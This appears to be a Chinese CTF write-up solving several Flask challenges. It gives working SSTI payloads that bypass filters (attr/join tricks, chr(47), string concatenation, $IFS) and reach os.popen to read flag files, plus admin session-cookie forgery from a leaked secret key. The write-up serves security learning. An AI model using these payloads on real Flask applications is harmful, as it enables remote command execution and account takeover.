# zerohenry/ctf_flask

![image-20240411185520262](%E7%BA%A2%E5%B2%A9%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%87%BA%E9%A2%98%E4%BA%92%E6%89%93%E9%A2%98%E8%A7%A3.assets/image-20240411185520262.png)

给出这个页面，那么前往/zerohenry页面查看，并用id作为参数

![image-20240411185553857](%E7%BA%A2%E5%B2%A9%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%87%BA%E9%A2%98%E4%BA%92%E6%89%93%E9%A2%98%E8%A7%A3.assets/image-20240411185553857.png)

ssti，那么先测试哪些符号被过滤了，我测出来的有：

单引号、双引号、中括号、双大括号、request、args

先把想要执行的命令写出来，再去进行修改，由于单双引号和request被过滤，所以我想到的就是使用变量

```py
目标：
{{lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("cat /flag")|attr("read")()}}
```

```py
{%set globals=dict(__globals__=a)|join%}
{%set getitem=dict(__getitem__=a)|join%} 
{%set os=dict(os=a)|join%} 
{%set popen=dict(popen=a)|join%} 
{%set kg=(lipsum|string|list)|attr(getitem)(9)%} 
{%set cmd=(dict(cat=a)|join,kg,dict(flag=a)|join)|join%}
{%set read=dict(read=a)|join%}
{%set res=lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()%}
{%print(res)%}
这个payload行不通，因为在cmd那里少了一个/，而这个斜杆我不知道如何获取，所以采取另一种方式，使用chr，而这个chr函数也需要我们去获取
目标：
(lipsum|attr("__globals__"))|attr("__builtins__")|attr(get)(chr)
构造：
{%set chr=dict(chr=a)|join%}
{%set get=dict(get=a)|join%}
{%set builtins=dict(__builtins__=a)|join%}
{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(chr)%}
```

```py
最终POC:
{%set globals=dict(__globals__=a)|join%}
{%set getitem=dict(__getitem__=a)|join%} 
{%set os=dict(os=a)|join%} 
{%set popen=dict(popen=a)|join%} 
{%set kg=(lipsum|string|list)|attr(getitem)(9)%}
{%set chr=dict(chr=a)|join%}
{%set get=dict(get=a)|join%}
{%set builtins=dict(__builtins__=a)|join%}
{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(chr)%} 
{%set cmd=(dict(cat=a)|join,kg,char(47),dict(flag=a)|join)|join%}
{%set read=dict(read=a)|join%}
{%set res=lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()%}
{%print(res)%}
```

![image-20240411210346096](%E7%BA%A2%E5%B2%A9%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%87%BA%E9%A2%98%E4%BA%92%E6%89%93%E9%A2%98%E8%A7%A3.assets/image-20240411210346096.png)

# asahisuki/flask-app

首先看源码得到一个信息就是，给出了key的值是noctchill，应该是secret_key，可以用来进行session伪造

![image-20240413170915093](%E7%BA%A2%E5%B2%A9%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%87%BA%E9%A2%98%E4%BA%92%E6%89%93%E9%A2%98%E8%A7%A3.assets/image-20240413170915093.png)

用户名密码都输出123，得到下面的页面

![image-20240413171024027](%E7%BA%A2%E5%B2%A9%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%87%BA%E9%A2%98%E4%BA%92%E6%89%93%E9%A2%98%E8%A7%A3.assets/image-20240413171024027.png)

用户名改成admin

![image-20240413171140885](%E7%BA%A2%E5%B2%A9%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%87%BA%E9%A2%98%E4%BA%92%E6%89%93%E9%A2%98%E8%A7%A3.assets/image-20240413171140885.png)

那用户名明确是admin了应该，login页面发现和主页面的session一致，应该从/dashboard页面入手，利用flask-session-cookie-manager工具进行session伪造

```shell
python3 flask_session_cookie_manager3.py decode -c "eyJ1c2VybmFtZSI6IjEyMyJ9.ZhpL-A.GMvEsB4FwO7dm_4zhE3oc7l4j2Y" -s "noctchill"
```

![image-20240413171430775](%E7%BA%A2%E5%B2%A9%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%87%BA%E9%A2%98%E4%BA%92%E6%89%93%E9%A2%98%E8%A7%A3.assets/image-20240413171430775.png)

得到当前的用户名

```shell
python3 flask_session_cookie_manager3.py encode -t "{'username': 'admin'}" -s "noctchill"
```

![image-20240413171509346](%E7%BA%A2%E5%B2%A9%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%87%BA%E9%A2%98%E4%BA%92%E6%89%93%E9%A2%98%E8%A7%A3.assets/image-20240413171509346.png)

得到伪造的session值，修改/dashboard页面的cookie，再刷新一下页面，来到第二关

![image-20240413171534372](%E7%BA%A2%E5%B2%A9%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%87%BA%E9%A2%98%E4%BA%92%E6%89%93%E9%A2%98%E8%A7%A3.assets/image-20240413171534372.png)

![image-20240413171609560](%E7%BA%A2%E5%B2%A9%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%87%BA%E9%A2%98%E4%BA%92%E6%89%93%E9%A2%98%E8%A7%A3.assets/image-20240413171609560.png)

查看源码，再加上主页面回显admin，得知参数为param，那么开始SSTI

![image-20240413171634028](%E7%BA%A2%E5%B2%A9%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%87%BA%E9%A2%98%E4%BA%92%E6%89%93%E9%A2%98%E8%A7%A3.assets/image-20240413171634028.png)

![image-20240413171651072](%E7%BA%A2%E5%B2%A9%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%87%BA%E9%A2%98%E4%BA%92%E6%89%93%E9%A2%98%E8%A7%A3.assets/image-20240413171651072.png)

发现过滤了中括号和单引号，双引号没被过滤，那就用双引号，得到这个玩意，应该是一个稀奇古怪的加密方式，社会主义核心价值观编码，得到flag{輝かせよう、アイドルのすべて}

```py
POC:
{{().__class__.__base__.__subclasses__().__getitem__(140).__init__.__globals__.__getitem__("popen")("cat flag").read()}}
```

> ### 公正公正公正诚信文明公正民主公正法治法治诚信民主友善爱国爱国友善平等诚信文明敬业友善法治友善爱国和谐爱国民主爱国友善平等诚信自由和谐爱国民主敬业诚信民主友善爱国和谐爱国文明爱国爱国友善爱国和谐爱国民主爱国公正诚信自由和谐爱国富强爱国民主诚信自由和谐爱国文明友善自由文明友善爱国和谐爱国文明诚信富强自由友善爱国和谐爱国和谐爱国敬业诚信自由和谐爱国和谐友善自由友善平等友善爱国和谐爱国民主诚信富强友善爱国诚信自由和谐爱国民主敬业敬业诚信自由和谐爱国民主友善平等敬业友善爱国和谐爱国民主友善自由公正法治友善法治

# quarter77/flask-2ss:latest

查看源码得到参数是?Taskmaster，先检查哪些被过滤掉了，应该是过滤了很多关键字，还有一些字符，比如管道符|，然后u00被过滤无法使用unicode编码绕过，+号，~未被过滤，但是{%set x=“__cla”%}{%set y=“ss\_\_”%}{{()[x~y]}}依旧绕不过，set，%，双引号都没被过滤，不知道为啥不行，这题也就卡住了

# yuccun/ssti

进入页面查看源代码，没发现啥，主页面应该是过滤的关键字，没给参数，然后尝试自己写了个?a={{7*7}}，成功回显49，那么开始注入

发现可以使用{{()['\_\_cla'+'ss\_\_']}}来绕过关键字过滤，那么直接构造payload

```py
POC:
http://172.31.130.66:8009?a={{config['__cl'+'ass__']['__in'+'it__']['__glo'+'bals__']['os']['po'+'pen']('ls')['read']()}}
```

![image-20240413182109514](%E7%BA%A2%E5%B2%A9%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%87%BA%E9%A2%98%E4%BA%92%E6%89%93%E9%A2%98%E8%A7%A3.assets/image-20240413182109514.png)

想直接cat，但是好像有空格的命令执行不了，使用$IFS绕过

```py
http://172.31.130.66:8009?a={{config['__cl'+'ass__']['__in'+'it__']['__glo'+'bals__']['os']['po'+'pen']('cat$IFS/flag.txt')['read']()}}
```

![image-20240413182950133](%E7%BA%A2%E5%B2%A9%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%87%BA%E9%A2%98%E4%BA%92%E6%89%93%E9%A2%98%E8%A7%A3.assets/image-20240413182950133.png)

# ar1s0/first_try:ezflask

这题把过滤的东西都放在页面上了，class被过滤就用+号能绕过，数字过滤，那么就不用数字了

```py
POC:
http://172.31.130.66:8010/?name={{config['__cl'+'ass__'].__init__.__globals__['os']['popen']('cat oh_you_find_me.txt').read()}}
```

![image-20240413184014071](%E7%BA%A2%E5%B2%A9%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%87%BA%E9%A2%98%E4%BA%92%E6%89%93%E9%A2%98%E8%A7%A3.assets/image-20240413184014071.png)
